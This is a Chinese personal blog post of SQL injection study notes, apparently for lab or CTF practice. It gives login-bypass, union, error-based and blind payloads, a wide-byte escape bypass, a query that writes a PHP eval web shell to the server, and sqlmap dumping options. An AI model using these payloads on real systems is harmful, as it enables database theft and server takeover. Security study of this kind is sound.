<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SQL注入总结 - 我的个人博客</title>
    <link rel="stylesheet" href="../css/style.css">
    <link rel="stylesheet" href="../css/markdown.css">
</head>

<body>
    <div class="container">
        <header>
            <h1>我的个人博客</h1>
            <nav>
                <span><a href="../index.html" class="no-underline">首页</a></span>
            </nav>
        </header>

        <main>
            <div class="messages-list">
                <div class="messages-header">
                    <h3>SQL注入总结</h3>
                    <a href="../index.html" class="btn">返回首页</a>
                </div>

                <div class="message-item">
                    <div class="message-header">
                        <span class="username">技术分享</span>
                        <span class="time">2025-12-20</span>
                    </div>
                    <div class="message-content">
                        <div class="markdown-content">
                            <h1>🔑 万能密码</h1>
                            <pre><code class="language-sql">' or 1=1#</code></pre>
                            <p><strong>登录语句原理：</strong></p>
                            <pre><code class="language-sql">SELECT * FROM users WHERE username='$user' AND password='$pass'</code></pre>
                            <hr>
                            <h2>🎯 SQL注入方式</h2>
                            <table>
                                <thead>
                                    <tr>
                                        <th>注入类型</th>
                                        <th>描述</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr>
                                        <td>联合查询注入</td>
                                        <td>通过UNION语句获取数据</td>
                                    </tr>
                                    <tr>
                                        <td>报错注入</td>
                                        <td>利用数据库报错信息获取数据</td>
                                    </tr>
                                    <tr>
                                        <td>布尔盲注</td>
                                        <td>通过真/假条件推断数据</td>
                                    </tr>
                                    <tr>
                                        <td>时间盲注</td>
                                        <td>通过延迟响应推断数据</td>
                                    </tr>
                                    <tr>
                                        <td>堆叠注入</td>
                                        <td>执行多条SQL语句</td>
                                    </tr>
                                    <tr>
                                        <td>内联注入</td>
                                        <td>将恶意代码注入到正常语句中</td>
                                    </tr>
                                </tbody>
                            </table>
                            <hr>
                            <h2>🔤 特殊符号</h2>
                            <h3>可用于闭合的符号</h3>
                            <pre><code class="language-bash">' &quot; )</code></pre>
                            <h3>可用于注释的符号</h3>
                            <pre><code class="language-bash">-- +     # MySQL注释
#        # MySQL注释  
/*       # 多行注释</code></pre>
                            <h3>可用于替代空格的符号</h3>
                            <pre><code class="language-bash">+        # 加号替代空格
/**/     # 多行注释替代空格
tab      # Tab键替代空格</code></pre>
                            <h3>information_schema.</h3>
                            <pre><code class="language-sql">schemata -- 所有的数据库
tables   -- 所有的表
columns  -- 所有的字段</code></pre>
                            <hr>
                            <h2>🔄 SQL注入流程</h2>
                            <h3>1. 判断注入点</h3>
                            <ul>
                                <li>确定注入点位置</li>
                                <li>判断注入类型</li>
                                <li>确定闭合方式</li>
                            </ul>
                            <h3>2. 判断字段数</h3>
                            <pre><code class="language-sql">ORDER BY 1,2,3...  # 递增测试直到报错</code></pre>
                            <h3>3. 判断回显点（联合查询）</h3>
                            <pre><code class="language-sql">UNION SELECT 1,2,3  # 确定数据显示位置</code></pre>
                            <h3>4.查询语句</h3>
                            <pre><code class="language-sql">-- 查表名
1,(select table_name from information_schema.tables where table_schema='library'),3,4
-- 查库名
1,(select group_concat(table_name) from information_schema.tables where table_schema='library'),3,4
-- 查字段名
1,(select group_concat(column_name) from information_schema.columns where table_name='flag'),3,4</code></pre>
                            <hr>
                            <h2>👁️ 布尔盲注</h2>
                            <p>基于布尔判断的盲注，通过页面的真/假响应获取信息。</p>
                            <h3>逻辑判断</h3>
                            <pre><code class="language-sql">AND  -- 两个条件都为真时返回真
OR   -- 两个条件中有一个为真时返回真  
NOT  -- 取反操作</code></pre>
                            <h3>注入流程</h3>
                            <h4>1. 确定注入点</h4>
                            <p><strong>方法：</strong> 通过添加 <code>'</code> 和注释符，观察页面响应变化</p>
                            <h4>2. 判断数据库版本</h4>
                            <pre><code class="language-sql">AND LEFT(VERSION(),1)=5  # 判断版本号第一位是否为5</code></pre>
                            <h4>3. 判断数据库名长度</h4>
                            <pre><code class="language-sql">AND LENGTH(DATABASE())=n  # n为猜测的长度</code></pre>
                            <h4>4. 猜解数据库名称</h4>
                            <pre><code class="language-sql">-- 字符串比较
ASCII(SUBSTR(DATABASE(),1,1))=115  # 's'的ASCII码

-- 字符串截取
SUBSTR(字符串, 起始位置, 截取长度)</code></pre>
                            <hr>
                            <h2>💥 报错注入</h2>
                            <p>利用数据库报错信息直接获取数据，比盲注更高效。</p>
                            <h3>注入流程</h3>
                            <h4>1. 判断注入类型</h4>
                            <p>测试各种注入方式，确定报错注入可行性</p>
                            <h4>2. 获取数据库名</h4>
                            <pre><code class="language-sql">UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),3)
-- 0x7e = ~ 符号，用于标识数据
-- 注意：XML XPath只显示32字符，需用SUBSTR截取</code></pre>
                            <h4>3. 查询表名</h4>
                            <pre><code class="language-sql">UPDATEXML(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='security'),0x7e),3)</code></pre>
                            <h4>4. 查询字段名</h4>
                            <pre><code class="language-sql">UPDATEXML(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'),0x7e),3)</code></pre>
                            <hr>
                            <h2>🌐 宽字节注入</h2>
                            <h3>原理</h3>
                            <p>目标对特殊符号进行转义，添加反斜杠 <code>\</code>（ASCII 92，十六进制 5c）</p>
                            <h3>绕过方法</h3>
                            <pre><code class="language-sql">%df  -- 与反斜杠(5c)组合成中文字符，绕过转义</code></pre>
                            <hr>
                            <h2>⚠️ 报错盲注</h2>
                            <p>手动构造错误条件，通过报错响应获取信息。</p>
                            <pre><code class="language-sql">SELECT IF((条件判断),EXP(5000),0)  -- EXP(5000)构造数值溢出错误
-- 或者使用COT(0)构造除零错误</code></pre>
                            <hr>
                            <h2>⏱️ 延时盲注</h2>
                            <p>通过控制响应时间来判断条件是否成立。</p>
                            <pre><code class="language-sql">IF((条件判断),SLEEP(5),0)  -- 条件成立时延迟5秒
-- 通过观察页面加载时间判断条件真假</code></pre>
                            <hr>
                            <h2>📝 写入文件读取注入</h2>
                            <p>将恶意代码写入服务器文件。</p>
                            <pre><code class="language-sql">UNION SELECT 1,'&lt;?php @eval($_POST[a]);?&gt;' INTO OUTFILE 'C:/www/2.php'-- +</code></pre>
                            <hr>
                            <h2>🛠️ SQLMap使用</h2>
                            <h3>基础参数</h3>
                            <table>
                                <thead>
                                    <tr>
                                        <th>参数</th>
                                        <th>说明</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr>
                                        <td><code>-u</code></td>
                                        <td>指定目标URL</td>
                                    </tr>
                                    <tr>
                                        <td><code>-p</code></td>
                                        <td>指定注入参数</td>
                                    </tr>
                                    <tr>
                                        <td><code>--batch</code></td>
                                        <td>自动化测试，全部默认确认</td>
                                    </tr>
                                    <tr>
                                        <td><code>--dbs</code></td>
                                        <td>获取所有数据库名</td>
                                    </tr>
                                    <tr>
                                        <td><code>--tables</code></td>
                                        <td>获取表名</td>
                                    </tr>
                                    <tr>
                                        <td><code>--columns</code></td>
                                        <td>获取字段名</td>
                                    </tr>
                                    <tr>
                                        <td><code>--dump</code></td>
                                        <td>获取字段内容</td>
                                    </tr>
                                </tbody>
                            </table>
                            <h3>高级参数</h3>
                            <pre><code class="language-bash"># 指定数据库、表、字段
-D database_name -T table_name -C column_name

# 多目标扫描
-m targets.txt

# Cookie绕过登录
--cookie=&quot;name=value&quot;

# 随机User-Agent
--random-agent

# POST请求
-r post_request.txt

# 测试等级
--level=1-5

# 绕过脚本
--tamper=space2comment  # 替换连续空格为注释</code></pre>
                            <h3>性能优化</h3>
                            <pre><code class="language-python"># 修改线程数配置文件：sqlmap\lib\core\settings.py
MAX_NUMBER_OF_THREADS = 10  # 根据需要调整</code></pre>
                        </div>
                    </div>
                </div>
            </div>
        </main>
    </div>
</body>

</html>